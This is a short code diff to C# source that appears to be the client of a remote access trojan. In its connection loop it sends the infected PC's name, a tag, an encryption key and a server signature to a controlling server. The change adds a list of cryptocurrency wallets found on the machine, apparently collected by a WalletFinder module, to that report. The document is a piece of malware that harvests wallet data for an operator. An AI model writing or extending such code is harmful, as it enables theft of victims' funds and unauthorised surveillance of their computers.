@@ -274,7 +274,8 @@ public void ConnectLoop()
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
-                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
+                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
+                    Wallets = WalletFinder.WalletFinder.GetFoundWallets()
                 });
             }
         }
